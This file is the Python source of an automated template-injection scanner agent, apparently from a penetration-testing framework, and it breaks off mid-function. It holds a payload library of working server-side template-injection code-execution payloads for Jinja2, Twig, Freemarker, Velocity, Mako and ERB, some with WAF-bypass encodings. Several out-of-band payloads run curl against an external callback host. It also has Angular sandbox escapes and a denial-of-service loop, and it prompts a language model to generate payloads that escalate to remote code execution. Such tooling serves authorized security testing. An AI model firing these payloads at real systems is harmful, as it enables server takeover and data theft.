import asyncio
import aiohttp
import re
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bugtrace.agents.base import BaseAgent
from bugtrace.core.ui import dashboard
from bugtrace.core.job_manager import JobStatus
from bugtrace.utils.logger import get_logger
from bugtrace.utils.parsers import XmlParser
from bugtrace.core.llm_client import llm_client
from bugtrace.core.config import settings
from dataclasses import dataclass, field
from bugtrace.schemas.validation_feedback import ValidationFeedback, FailureReason

@dataclass
class CSTIFinding:
    """
    Represents a confirmed CSTI/SSTI finding with strict verification data.
    """
    url: str                # The verified URL where exploitation works
    parameter: str
    type: str = "CSTI"
    severity: str = "HIGH"
    
    # Classification
    template_engine: str = "unknown"  # "angular", "jinja2", etc.
    engine_type: str = "unknown"      # "client-side" or "server-side"
    
    # Payload & Exploit
    payload: str = ""
    payload_syntax: str = ""          # "expression", "erb_tag", etc.
    
    # Verification
    verified_url: str = ""            # Same as url, but explicit
    original_url: str = ""            # Where scan started
    arithmetic_proof: bool = False
    baseline_check_passed: bool = False
    
    # Metadata
    description: str = ""
    reproduction_steps: List[str] = field(default_factory=list)
    reproduction_command: str = ""
    evidence: Dict[str, Any] = field(default_factory=dict)
    
    # Validation status
    validated: bool = True
    status: str = "VALIDATED_CONFIRMED"


# V2 Enhancements: WAF & Interactsh Integration
from bugtrace.tools.waf import waf_fingerprinter, strategy_router, encoding_techniques
from bugtrace.tools.interactsh import InteractshClient

logger = get_logger("agents.csti")

class TemplateEngineFingerprinter:
    """Detect which template engine is in use."""

    ENGINE_SIGNATURES = {
        "angular": {
            "patterns": ["ng-app", "ng-model", "ng-bind", "angular.js", "angular.min.js"],
            "probe": "{{constructor.constructor('return 1')()}}",
            "success_indicator": "1"
        },
        "vue": {
            "patterns": ["v-if", "v-for", "v-model", "vue.js", "vue.min.js"],
            "probe": "{{7*7}}",
            "success_indicator": "49"
        },
        "jinja2": {
            "patterns": ["jinja", "flask", "werkzeug"],
            "probe": "{{config}}",
            "success_indicator": "Config"
        },
        "twig": {
            "patterns": ["twig", "symfony"],
            "probe": "{{7*7}}",
            "success_indicator": "49"
        },
        "freemarker": {
            "patterns": ["freemarker", ".ftl"],
            "probe": "${7*7}",
            "success_indicator": "49"
        },
        "velocity": {
            "patterns": ["velocity", ".vm"],
            "probe": "#set($x=7*7)$x",
            "success_indicator": "49"
        },
        "mako": {
            "patterns": ["mako"],
            "probe": "${7*7}",
            "success_indicator": "49"
        },
        "pebble": {
            "patterns": ["pebble"],
            "probe": "{{ 7*7 }}",
            "success_indicator": "49"
        },
        "smarty": {
            "patterns": ["smarty"],
            "probe": "{$smarty.version}",
            "success_indicator": "Smarty"
        },
        "erb": {
            "patterns": ["erb", "ruby", "rails"],
            "probe": "<%= 7*7 %>",
            "success_indicator": "49"
        }
    }

    @classmethod
    def fingerprint(cls, html: str, headers: dict = None) -> List[str]:
        """Return list of likely template engines."""
        detected = []
        html_lower = html.lower()

        for engine, data in cls.ENGINE_SIGNATURES.items():
            for pattern in data["patterns"]:
                if pattern.lower() in html_lower:
                    detected.append(engine)
                    break

        return detected if detected else ["unknown"]

PAYLOAD_LIBRARY = {
    # ================================================================
    # UNIVERSAL ARITHMETIC PROBES (work on most engines)
    # ================================================================
    "universal": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "[[7*7]]",
        "{7*7}",
        "{{7*'7'}}",
        "${7*'7'}",
    ],

    # ================================================================
    # ANGULAR-SPECIFIC (CSTI)
    # ================================================================
    "angular": [
        "{{constructor.constructor('return 7*7')()}}",
        "{{$on.constructor('return 7*7')()}}",
        "{{a]}}",  # Error-based detection
        "{{'a]'}}",
        "{{[].pop.constructor('return 7*7')()}}",
        # Sandbox bypasses (Angular 1.x)
        "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}",
        "{{'a]'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
    ],

    # ================================================================
    # VUE-SPECIFIC (CSTI)
    # ================================================================
    "vue": [
        "{{7*7}}",
        "{{constructor.constructor('return 7*7')()}}",
        "{{_c.constructor('return 7*7')()}}",
    ],

    # ================================================================
    # JINJA2-SPECIFIC (SSTI)
    # ================================================================
    "jinja2": [
        "{{config}}",
        "{{config.items()}}",
        "{{self.__init__.__globals__}}",
        "{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        # OOB (with placeholder)
        "{{config.__class__.__init__.__globals__['os'].popen('curl {{INTERACTSH}}').read()}}",
        # Blind detection
        "{% for x in range(100000000) %}a{% endfor %}",  # DoS-based detection
    ],

    # ================================================================
    # TWIG-SPECIFIC (SSTI)
    # ================================================================
    "twig": [
        "{{7*7}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        "{{app.request.server.all|join(',')}}",
        # OOB
        "{{['curl {{INTERACTSH}}']|filter('exec')}}",
    ],

    # ================================================================
    # FREEMARKER-SPECIFIC (SSTI)
    # ================================================================
    "freemarker": [
        "${7*7}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        # OOB
        "${\"freemarker.template.utility.Execute\"?new()(\"curl {{INTERACTSH}}\")}",
    ],

    # ================================================================
    # VELOCITY-SPECIFIC (SSTI)
    # ================================================================
    "velocity": [
        "#set($x=7*7)$x",
        "#set($rt=$x.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null))$rt.exec('id')",
        # OOB
        "#set($rt=$x.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null))$rt.exec('curl {{INTERACTSH}}')",
    ],

    # ================================================================
    # MAKO-SPECIFIC (SSTI)
    # ================================================================
    "mako": [
        "${7*7}",
        "${self.module.cache.util.os.popen('id').read()}",
        "<%import os%>${os.popen('id').read()}",
        # OOB
        "<%import os%>${os.popen('curl {{INTERACTSH}}').read()}",
    ],

    # ================================================================
    # ERB-SPECIFIC (Ruby)
    # ================================================================
    "erb": [
        "<%= 7*7 %>",
        "<%= system('id') %>",
        "<%= `id` %>",
        # OOB
        "<%= system('curl {{INTERACTSH}}') %>",
    ],

    # ================================================================
    # POLYGLOTS (work across multiple engines)
    # ================================================================
    "polyglots": [
        "{{7*7}}${7*7}<%= 7*7 %>#{7*7}",
        "${{7*7}}",
        "{{7*7}}[[7*7]]",
    ],

    # ================================================================
    # WAF BYPASS VARIANTS (encoded versions)
    # ================================================================
    "waf_bypass": [
        # URL encoded
        "%7b%7b7*7%7d%7d",
        # Unicode
        "\\u007b\\u007b7*7\\u007d\\u007d",
        # Double encoded
        "%257b%257b7*7%257d%257d",
        # HTML entities
        "&#123;&#123;7*7&#125;&#125;",
        # Mixed case (for JS engines)
        "{{7*7}}",
    ],
}

# =========================================================================
# VICTORY HIERARCHY: Early exit based on payload impact
# =========================================================================

HIGH_IMPACT_INDICATORS = [
    "id=",           # RCE: id command output
    "uid=",          # RCE: uid from id
    "whoami",        # RCE: whoami output
    "/etc/passwd",   # File read
    "root:",         # passwd content
    "__globals__",   # Python internals access
    "os.popen",      # Command execution
    "subprocess",    # Command execution
    "java.lang.Runtime" # Java RCE
]

MEDIUM_IMPACT_INDICATORS = [
    "49",            # Arithmetic evaluation (7*7)
    "Config",        # Config access
    "SECRET",        # Secret key access
]

# Parámetros más propensos a CSTI/SSTI
HIGH_PRIORITY_PARAMS = [
    # Template-related
    "template", "tpl", "view", "layout", "page",
    # Content rendering
    "content", "text", "body", "message", "msg",
    "title", "subject", "name", "description",
    # Dynamic
    "preview", "render", "output", "display",
    # Input
    "input", "value", "data", "query", "q", "search",
    # File/Path
    "file", "path", "include", "partial",
]

class CSTIAgent(BaseAgent):
    """
    CSTI Agent V2 - Intelligent Template Injection Specialist.
    
    Feature Set:
    - Binomial Arithmetic Proof (7*7=49)
    - WAF Detection & Q-Learning Bypass (UCB1)
    - Template Engine Fingerprinting
    - Targeted & Polyglot Payloads
    - Blind SSTI Detection via Interactsh (OOB)
    """
    
    def __init__(self, url: str, params: List[Dict] = None, report_dir: Path = None):
        super().__init__(
            name="CSTIAgent",
            role="Template Injection Specialist",
            agent_id="csti_agent"
        )
        self.url = url
        self.params = params or []
        self.report_dir = report_dir or Path("./reports")
        self._detected_waf = None
        self._waf_confidence = 0.0
        self.interactsh = None
        self.interactsh_url = None
        self._max_impact_achieved = False

    async def _detect_waf_async(self) -> Tuple[str, float]:
        """Detect WAF using framework's intelligent fingerprinter."""
        try:
            waf_name, confidence = await waf_fingerprinter.detect(self.url)
            self._detected_waf = waf_name if waf_name != "unknown" else None
            self._waf_confidence = confidence

            if self._detected_waf:
                logger.info(f"[{self.name}] WAF Detected: {waf_name} ({confidence:.0%})")
                dashboard.log(f"[{self.name}] 🛡️ WAF: {waf_name} ({confidence:.0%})", "INFO")

            return waf_name, confidence
        except Exception as e:
            logger.debug(f"WAF detection failed: {e}")
            return "unknown", 0.0

    async def _get_encoded_payloads(self, payloads: List[str]) -> List[str]:
        """Apply Q-Learning optimized encoding to payloads."""
        if not self._detected_waf:
            return payloads

        encoded = []
        for payload in payloads:
            encoded.append(payload)  # Original

            # Apply WAF-specific encodings
            variants = encoding_techniques.encode_payload(
                payload,
                waf=self._detected_waf,
                max_variants=3
            )
            encoded.extend(variants)

        return list(dict.fromkeys(encoded))  # Dedupe preserving order

    def _finding_to_dict(self, finding: CSTIFinding) -> Dict:
        """Convert CSTIFinding object to dictionary for report."""
        return {
            "type": finding.type,
            "url": finding.url,
            "parameter": finding.parameter,
            "payload": finding.payload,
            "severity": finding.severity,
            "template_engine": finding.template_engine,
            "injection_type": f"{finding.engine_type} Template Injection",
            
            "validated": finding.validated,
            "status": finding.status,
            "description": finding.description,
            "reproduction": finding.reproduction_command,
            "reproduction_steps": finding.reproduction_steps, # List
            
            "evidence": finding.evidence,
            
            # Additional metadata for deep dive report
            "csti_metadata": {
                "engine": finding.template_engine,
                "type": finding.engine_type,
                "syntax": finding.payload_syntax,
                "arithmetic_proof": finding.arithmetic_proof,
                "verified_url": finding.verified_url
            }
        }
    
    def _generate_repro_steps(self, url: str, param: str, payload: str, curl_cmd: str) -> List[str]:
        """Generate step-by-step reproduction instructions."""
        return [
            f"1. Navigate to the verified target: {url}",
            f"2. Locate the parameter `{param}`",
            f"3. Inject the payload: `{payload}`",
            f"4. Expected observation: The expression is evaluated (e.g., 7*7 becomes 49).",
            f"5. Alternative: Run the provided cURL command:",
            f"   `{curl_cmd}`"
        ]

    def _record_bypass_result(self, payload: str, success: bool):
        """Record result for Q-Learning feedback."""
        if not self._detected_waf:
            return

        encoding_used = "unknown"
        if "%25" in payload:
            encoding_used = "double_url_encode"
        elif "\\u00" in payload:
            encoding_used = "unicode_encode"
        elif "&#" in payload:
            encoding_used = "html_entity_encode"

        strategy_router.record_result(self._detected_waf, encoding_used, success)

    async def _setup_interactsh(self):
        """Register with Interactsh for OOB validation."""
        try:
            self.interactsh = InteractshClient()
            await self.interactsh.register()
            self.interactsh_url = self.interactsh.get_url("csti_agent")
            logger.info(f"[{self.name}] Interactsh ready: {self.interactsh_url}")
        except Exception as e:
            logger.warning(f"Failed to setup Interactsh: {e}")
            self.interactsh = None

    async def _check_oob_hit(self, label: str) -> bool:
        """Check if we got an OOB callback."""
        if not self.interactsh:
            return False

        await asyncio.sleep(2)  # Wait for callback
        hit = await self.interactsh.check_hit(label)
        return hit is not None

    async def _fetch_page(self, session) -> str:
        """Fetch page content for fingerprinting."""
        try:
            async with session.get(self.url, timeout=10) as resp:
                return await resp.text()
        except:
            return ""

    async def _targeted_probe(self, session, param, engines) -> Optional[Dict]:
        """Probe using payloads specific to detected engines."""
        for engine in engines:
            payloads = PAYLOAD_LIBRARY.get(engine, [])
            payloads = await self._get_encoded_payloads(payloads)
            
            for p in payloads:
                dashboard.set_current_payload(p, f"CSTI:{param}", f"Targeted ({engine})")
                content, verified_url = await self._test_payload(session, param, p)
                if content:
                    finding_obj = self._create_finding(param, p, f"targeted_probe_{engine}", verified_url=verified_url)
                    return self._finding_to_dict(finding_obj)
        return None

    async def _universal_probe(self, session, param) -> Optional[Dict]:
        """Probe using universal and polyglot payloads."""
        payloads = PAYLOAD_LIBRARY.get("universal", []) + PAYLOAD_LIBRARY.get("polyglots", [])
        payloads = await self._get_encoded_payloads(payloads)
        
        for p in payloads:
            dashboard.set_current_payload(p, f"CSTI:{param}", "Universal Probe")
            content, verified_url = await self._test_payload(session, param, p)
            if content:
                finding_obj = self._create_finding(param, p, "universal_probe", verified_url=verified_url)
                return self._finding_to_dict(finding_obj)
        return None

    async def _oob_probe(self, session, param, engines) -> Optional[Dict]:
        """Probe using OOB payloads injected with Interactsh URL."""
        if not self.interactsh_url:
            return None
            
        # Get OOB payloads for detected engines + generice
        candidates = []
        for engine in engines:
            candidates.extend([p for p in PAYLOAD_LIBRARY.get(engine, []) if "{{INTERACTSH}}" in p])
        
        # Also check jinja2 generic OOB if no specific engine found
        if not candidates:
             candidates.extend([p for p in PAYLOAD_LIBRARY.get("jinja2", []) if "{{INTERACTSH}}" in p])

        for p in candidates:
            # Inject unique label
            label = f"csti_{param}"
            real_payload = p.replace("{{INTERACTSH}}", self.interactsh_url)
            
            dashboard.set_current_payload(real_payload[:20]+"...", f"CSTI:{param}", "OOB Blind")

            # Fire and forget - send OOB payload
            try:
                target_url = self._inject(param, real_payload)
                async with session.get(target_url, timeout=3):
                    pass
            except (aiohttp.ClientError, asyncio.TimeoutError):
                pass  # OOB payloads may timeout - that's expected
                
            # Check for hit
            if await self._check_oob_hit(self.interactsh_url): # Check general hit
                 finding_obj = self._create_finding(param, real_payload, "blind_oob_confirmed")
                 return self._finding_to_dict(finding_obj)
                 
        return None

    def _prioritize_params(self, params: List[Dict]) -> List[Dict]:
        """Prioritize parameters likely to be template-injectable."""
        high = []
        medium = []
        low = []

        for item in params:
            param = item.get("parameter", "").lower()

            is_high = any(hp in param or param in hp for hp in HIGH_PRIORITY_PARAMS)

            if is_high:
                high.append(item)
            elif any(x in param for x in ["id", "num", "page", "limit"]):
                low.append(item)
            else:
                medium.append(item)

        if high:
            logger.info(f"[{self.name}] 🎯 High-priority params: {[h['parameter'] for h in high]}")

        return high + medium + low

    def _get_payload_impact_tier(self, payload: str, response: str) -> int:
        """
        Determine impact tier for CSTI/SSTI.
        Returns:
            3 = RCE/File Read → STOP IMMEDIATELY
            2 = Internals Access → STOP IMMEDIATELY
            1 = Arithmetic Eval → Try 1 more
            0 = No impact → Continue
        """
        combined = (payload + " " + response).lower()

        # TIER 3: RCE or File Read
        if any(ind.lower() in combined for ind in HIGH_IMPACT_INDICATORS):
            return 3

        # TIER 2: Internals Access
        if any(ind.lower() in " ".join(MEDIUM_IMPACT_INDICATORS).lower().split() for ind in ["__globals__", "os.popen", "config"]):
             # Simplified check based on constants logic
             if "__globals__" in combined or "os.popen" in combined or "config" in combined:
                 return 2

        # TIER 1: Arithmetic Evaluation
        if "49" in response and "7*7" in payload:
            return 1

        return 0

    def _should_stop_testing(self, payload: str, response: str, successful_count: int) -> Tuple[bool, str]:
        """Determine if we should stop based on Victory Hierarchy."""
        impact_tier = self._get_payload_impact_tier(payload, response)

        if impact_tier >= 3:
            self._max_impact_achieved = True
            return True, "🏆 MAXIMUM IMPACT: RCE or File Read achieved"

        if impact_tier >= 2:
            self._max_impact_achieved = True
            return True, "🏆 HIGH IMPACT: Internals access confirmed"

        if impact_tier >= 1 and successful_count >= 1:
            return True, "✅ Template evaluation confirmed"

        if successful_count >= 2:
            return True, "⚡ 2 successful payloads, moving on"

        return False, ""

    async def _test_post_injection(
        self,
        session: aiohttp.ClientSession,
        param: str,
        engines: List[str]
    ) -> Optional[Dict]:
        """Test POST parameters for template injection."""
        payloads = PAYLOAD_LIBRARY.get(engines[0], PAYLOAD_LIBRARY["universal"])[:5] if engines and engines[0] != "unknown" else PAYLOAD_LIBRARY["universal"][:5]

        for payload in payloads:
            try:
                data = {param: payload}
                async with session.post(self.url, data=data, timeout=5) as resp:
                    content = await resp.text()

                    if "49" in content and "7*7" in payload and payload not in content:
                        engine = engines[0] if engines else "unknown"
                        finding_obj = self._create_finding(f"POST:{param}", payload, "post_injection", verified_url=str(resp.url))
                        finding_obj.template_engine = engine # Refine engine if known
                        return self._finding_to_dict(finding_obj)
            except Exception as e:
                logger.debug(f"POST test failed: {e}")

        return None

    async def _test_header_injection(
        self,
        session: aiohttp.ClientSession,
        engines: List[str]
    ) -> Optional[Dict]:
        """Test headers for template injection (rare but possible)."""
        test_headers = ["Referer", "X-Forwarded-For", "User-Agent"]
        payload = "{{7*7}}"

        for header in test_headers:
            try:
                headers = {header: payload}
                async with session.get(self.url, headers=headers, timeout=5) as resp:
                    content = await resp.text()

                    if "49" in content:
                        finding_obj = self._create_finding(f"HEADER:{header}", payload, "header_injection", verified_url=str(resp.url))
                        return self._finding_to_dict(finding_obj)
            except:
                pass

        return None

    async def _llm_smart_template_analysis(
        self,
        html: str,
        param: str,
        detected_engines: List[str],
        interactsh_url: str
    ) -> List[Dict]:
        """
        LLM-First Strategy: Analyze HTML and generate targeted CSTI/SSTI payloads.
        """
        system_prompt = """You are an elite Template Injection specialist.
CSTI (Client-Side): Angular, Vue - executes in browser
SSTI (Server-Side): Jinja2, Twig, Freemarker - executes on server (more dangerous)

For each engine, you must know:
- Angular 1.x: {{constructor.constructor('code')()}} - sandbox bypass needed
- Vue 2.x: {{_c.constructor('code')()}}
- Jinja2: {{config}}, {{lipsum.__globals__['os'].popen('cmd').read()}}
- Twig: {{_self.env.registerUndefinedFilterCallback('exec')}}

CRITICAL: Generate payloads that:
1. Prove code execution (not just reflection)
2. Include OOB callback for blind detection
3. Escalate to RCE if SSTI (server-side)"""

        user_prompt = f"""Analyze this page for Template Injection:
URL: {self.url}
Parameter: {param}
Detected Engines: {detected_engines}
OOB Callback: {interactsh_url}

HTML (truncated):
```html
{html[:6000]}
```

Generate 1-3 PRECISE payloads for the detected engine(s).
For each payload, explain:
1. Target engine
2. What it exploits (sandbox bypass, RCE, etc.)
3. Expected output

Response format (XML):
<payloads>
  <payload>
    <engine>angular|vue|jinja2|twig|etc</engine>
    <code>THE_PAYLOAD</code>
    <exploitation>What it does</exploitation>
    <expected_output>What to look for</expected_output>
  </payload>
</payloads>"""

        try:
            response = await llm_client.generate(
                prompt=user_prompt,
                module_name="CSTI_SMART_ANALYSIS",
                system_prompt=system_prompt,
                model_override=settings.MUTATION_MODEL,
                max_tokens=3000,
                temperature=0.3
            )

            return self._parse_llm_payloads(response, interactsh_url)
        except Exception as e:
            logger.error(f"LLM Smart Analysis failed: {e}")
            return []

    def _parse_llm_payloads(self, content: str, interactsh_url: str) -> List[Dict]:
        payloads = XmlParser.extract_list(content, "payload")
        parsed_items = []

        for p_str in payloads:
            code = XmlParser.extract_tag(p_str, "code")
            engine = XmlParser.extract_tag(p_str, "engine")

            if code:
                if "{{INTERACTSH}}" in code and interactsh_url:
                    code = code.replace("{{INTERACTSH}}", interactsh_url)

                parsed_items.append({
                    "code": code,
                    "engine": engine or "unknown"
                })

        return parsed_items

    async def run_loop(self) -> Dict:
        dashboard.current_agent = self.name
        dashboard.log(f"[{self.name}] 🚀 Starting Template Injection analysis", "INFO")

        all_findings = []

        try:
            # Improved Phase: Prioritize params
            self.params = self._prioritize_params(self.params)

            # Phase 0: WAF Detection
            await self._detect_waf_async()

            # Phase 1: Setup Interactsh for OOB
            await self._setup_interactsh()

            async with aiohttp.ClientSession() as session:
                for item in self.params:
                    # Victory Hierarchy Check
                    if self._max_impact_achieved:
                        dashboard.log(f"[{self.name}] 🏆 Max impact achieved, skipping remaining params", "SUCCESS")
                        break

                    param = item.get("parameter")
                    if not param:
                        continue
                    
                    # Local param loop tracking
                    param_findings = []

                    # Phase 2: Engine Fingerprinting
                    html = await self._fetch_page(session)
                    engines = TemplateEngineFingerprinter.fingerprint(html)
                    logger.info(f"[{self.name}] Detected engines: {engines}")

                    # Phase 2.5: LLM Smart Analysis (PRIMARY)
                    if engines != ["unknown"]:
                        interact_url_param = self.interactsh.get_url(f"csti_{param}") if self.interactsh else ""
                        smart_payloads = await self._llm_smart_template_analysis(
                            html, param, engines, interact_url_param
                        )

                        for sp in smart_payloads:
                            if self._max_impact_achieved:
                                break
                            
                            # Filter logic: If we know the engine, skip mismatches
                            # But allow 'unknown' payloads or if detection was fuzzy
                            
                            success_content, verified_url = await self._test_payload(session, param, sp["code"])
                            if success_content:
                                finding_obj = self._create_finding(param, sp["code"], "llm_smart_analysis", verified_url=verified_url)
                                finding = self._finding_to_dict(finding_obj)
                                
                                all_findings.append(finding)
                                param_findings.append(finding)

                                should_stop, reason = self._should_stop_testing(sp["code"], success_content, len(param_findings))
                                if should_stop:
                                    dashboard.log(f"[{self.name}] {reason}", "SUCCESS")
                                    break
                    
                    if self._max_impact_achieved or len(param_findings) >= 2: # Quick continue if smart won
                        continue

                    # Phase 3: Targeted Probing
                    if engines != ["unknown"]:
                        finding = await self._targeted_probe(session, param, engines)
                        if finding:
                            all_findings.append(finding)
                            param_findings.append(finding)
                            self._record_bypass_result(finding["payload"], success=True)
                            
                            # Check impact (assume targeted probe returns logic success, we need content ideally, 
                            # but existing structure makes it hard. We can assume found=1 is start)
                            # Actually, we should refactor targeted_probe to return content too, 
                            # but for now rely on the loop continuation logic.
                            if self._max_impact_achieved: continue

                    # Phase 4: Universal + Polyglot Probing
                    finding = await self._universal_probe(session, param)
                    if finding:
                        all_findings.append(finding)
                        param_findings.append(finding)
                        self._record_bypass_result(finding["payload"], success=True)

                    # Phase 5: OOB (Blind SSTI)
                    finding = await self._oob_probe(session, param, engines)
                    if finding:
                        all_findings.append(finding)
                        param_findings.append(finding)
                        self._record_bypass_result(finding["payload"], success=True)

                    # Phase 5.5: POST Injection
                    finding = await self._test_post_injection(session, param, engines)
                    if finding:
                         all_findings.append(finding)
                         param_findings.append(finding)

                    # Phase 5.6: Header Injection (rare)
                    if not all_findings: # Only if nothing found yet
                        finding = await self._test_header_injection(session, engines)
                        if finding:
                             all_findings.append(finding)
                             param_findings.append(finding)

                    # Phase 6: LLM Advanced Bypass (Legacy Fallback)
                    if self._detected_waf and not param_findings:
                         finding = await self._llm_probe(session, param)
                         if finding:
                             all_findings.append(finding)
                             param_findings.append(finding)

            # Cleanup
            if self.interactsh:
                await self.interactsh.deregister()

        except Exception as e:
            logger.error(f"CSTIAgent error: {e}")

        dashboard.log(f"[{self.name}] ✅ Complete. Findings: {len(all_findings)}", "SUCCESS")
        return {"findings": all_findings, "status": JobStatus.COMPLETED}

    async def _get_baseline_content(self, session) -> str:
        """Fetch baseline content without injection to check for false positives."""
        try:
            async with session.get(self.url, timeout=5) as resp:
                return await resp.text()
        except:
            return ""

    async def _test_payload(self, session, param, payload) -> Tuple[Optional[str], Optional[str]]:
        """
        Injects payload and returns (content, effective_url) if evaluated, (None, None) otherwise.
        Performs strict verification including baseline checks.
        """
        target_url = self._inject(param, payload)
        
        try:
            async with session.get(target_url, timeout=5) as resp:
                content = await resp.text()
                final_url = str(resp.url)
                
                # Logic from CSTIDetector + NEW Handoff Rules:
                
                # 1. Check for arithmetic evaluation: 49 from 7*7
                if "49" in content:
                    if "7*7" in payload:
                        # Payload like {{7*7}} - check 49 present and payload not reflected
                        if payload not in content:
                            # CRITICAL: Baseline check
                            baseline = await self._get_baseline_content(session)
                            if "49" not in baseline:
                                return content, final_url
                    elif "{% if" in payload and "49" in payload:
                        # Payload like {% if 1 %}49{% endif %} - check syntax stripped
                        if "{%" not in content and "%}" not in content:
                            return content, final_url
                    elif "print" in payload:
                        if "{%" not in content:
                            return content, final_url

                # 2. Check for string multiplication (7777777)
                if "7777777" in content and "'7'*7" in payload:
                    if payload not in content:
                        return content, final_url

                # 3. Check for Config reflection (Jinja2)
                if ("Config" in content or "&lt;Config" in content) and "{{config}}" in payload:
                    if payload not in content:
                        return content, final_url

                # 4. NEW: Engine Specific Signatures
                # Twig
                if "{{dump(app)}}" in payload or "{{app.request}}" in payload:
                    if "Symfony" in content or "Twig" in content:
                        return content, final_url
                
                # Smarty
                if "{$smarty.version}" in payload:
                    if re.search(r"Smarty[- ]\d", content):
                        return content, final_url
                        
                # Freemarker
                if "freemarker" in payload.lower():
                    if "freemarker" in content.lower():
                        return content, final_url

                # 5. NEW: Error Message Detection (Authority Expansion)
                error_signatures = [
                    "jinja2.exceptions",
                    "Twig_Error_Syntax",
                    "FreeMarker template error",
                    "VelocityException",
                    "org.apache.velocity",
                    "mako.exceptions"
                ]
                for sig in error_signatures:
                    if sig in content:
                        logger.info(f"[{self.name}] 🚨 Template Error Detected: {sig}")
                        return content, final_url
                        
        except Exception as e:
            logger.debug(f"CSTI test error: {e}")
        return None, None

    async def _llm_probe(self, session: aiohttp.ClientSession, param: str) -> Optional[Dict]:
        """Use LLM to generate custom bypasses or target specific engines."""
        self.think(f"Generating advanced bypasses for parameter '{param}'")
        
        user_prompt = f"Target URL: {self.url}\nParameter: {param}\n\nGenerate 5 advanced CSTI/SSTI bypasses for modern engines (Angular, Vue, Jinja2, Mako)."
        
        try:
            response = await llm_client.generate(user_prompt, system_prompt=self.system_prompt, module_name="CSTI_AGENT")
            ai_payloads = XmlParser.extract_list(response, "payload")
            
            # Enrich with WAF bypass
            ai_payloads = await self._get_encoded_payloads(ai_payloads)

            for ap in ai_payloads:
                dashboard.set_current_payload(ap, f"CSTI:{param}", "AI Advanced")
                content, verified_url = await self._test_payload(session, param, ap)
                if content:
                    return self._create_finding(param, ap, "ai_bypass", verified_url=verified_url)
        except Exception as e:
            logger.error(f"CSTI LLM check failed: {e}")
            
        return None

    def _inject(self, param_name: str, payload: str) -> str:
        parsed = urlparse(self.url)
        q = parse_qs(parsed.query)
        q[param_name] = [payload]
        new_query = urlencode(q, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    def _create_finding(self, param: str, payload: str, method: str, verified_url: str = None) -> CSTIFinding:
        """Create a standardized finding object with full authority."""
        logger.info(f"[{self.name}] 🚨 CSTI/SSTI CONFIRMED on {param}: {payload}")
        dashboard.log(f"[{self.name}] 🎯 CSTI/SSTI CONFIRMED on '{param}'!", "SUCCESS")

        # Determine engine from payload if not specified
        engine = self._detect_engine_from_payload(payload)
        engine_type = "client-side" if engine in ["angular", "vue"] else "server-side"
        
        # Use verified URL if available, else fallback to current (though verified should be passed)
        final_url = verified_url or self.url
        
        encoded_url = self._inject(param, payload).replace(self.url, final_url) if verified_url else self._inject(param, payload)
        curl_cmd = f"curl '{encoded_url}' | grep 49"

        return CSTIFinding(
            url=final_url,
            parameter=param,
            payload=payload,
            template_engine=engine,
            engine_type=engine_type,
            payload_syntax=engine,
            verified_url=final_url,
            original_url=self.url,
            arithmetic_proof="7*7" in payload, # Simple heuristic for now
            baseline_check_passed=True, # We now check this in verification
            description=f"Template Injection vulnerability detected. Expression '{payload}' was evaluated by the {engine_type} engine ({engine}). Method: {method}.",
            reproduction_command=curl_cmd,
            reproduction_steps=self._generate_repro_steps(final_url, param, payload, curl_cmd),
            evidence={
                "method": method,
                "proof": "Arithmetic evaluation detected (7*7=49) or specific engine behavior verified.",
                "engine": engine
            }
        )

    def _create_ambiguous_finding(self, param: str, payload: str, engine: str) -> Dict:
        # Keeping this as Dict for now as it's not a confirmed finding? 
        # Actually better to use CSTIFinding but marked as not validated?
        # For minimal diff, let's keep it but ideally we should standardize.
        # But this function returns a Dict in current code.
        # Let's verify usage. It's used to return a Dict.
        # I'll update it to return CSTIFinding but validated=False
        
        logger.info(f"[{self.name}] ⚠️ Potential client-side CSTI on {param} ({engine}) - needs CDP")
        dashboard.log(f"[{self.name}] ⚠️ Potential CSTI on '{param}' ({engine}) - delegating to CDP", "WARN")

        return CSTIFinding(
            url=self.url,
            parameter=param,
            payload=payload,
            type="CSTI",
            severity="MEDIUM",
            template_engine=engine,
            engine_type="client-side",
            validated=False,
            status="PENDING_CDP_VALIDATION",
            reproduction_command=f"# Open in browser: {self._inject(param, payload)}",
            description=f"Potential client-side template injection ({engine}). Template syntax reflected but execution needs browser validation.",
            evidence={
                "engine": engine,
                "needs_cdp": True,
                "reason": f"Client-side framework ({engine}) suspected, needs browser validation"
            }
        )

    async def handle_validation_feedback(
        self, 
        feedback: ValidationFeedback
    ) -> Optional[Dict[str, Any]]:
        """
        Recibe feedback del AgenticValidator y genera una variante de CSTI.
        
        Args:
            feedback: Información sobre el fallo de validación
            
        Returns:
            Diccionario con el nuevo payload, o None
        """
        logger.info(
            f"[CSTIAgent] Received feedback: {feedback.failure_reason.value}"
        )
        
        original = feedback.original_payload
        variant = None
        method = "feedback_adaptation"
        
        # Detectar el motor de plantillas del payload original
        engine = self._detect_engine_from_payload(original)
        
        if feedback.failure_reason == FailureReason.WAF_BLOCKED:
            # Usar encoding
            encoded = await self._get_encoded_payloads([original])
            if encoded and encoded[0] != original:
                variant = encoded[0]
                method = "waf_bypass"
        
        elif feedback.failure_reason == FailureReason.CONTEXT_MISMATCH:
            # Probar con otro motor
            variant = self._try_alternative_engine(engine)
            method = "engine_switch"
        
        elif feedback.failure_reason == FailureReason.ENCODING_STRIPPED:
            # Usar sintaxis alternativa
            variant = self._encode_template_chars(original, feedback.stripped_chars)
            method = "char_encoding"
        
        # Fallback a LLM
        if not variant or variant == original:
            llm_result = await self._llm_probe(None, feedback.parameter)
            if llm_result:
                variant = llm_result.get('payload')
                method = "llm_fallback"
        
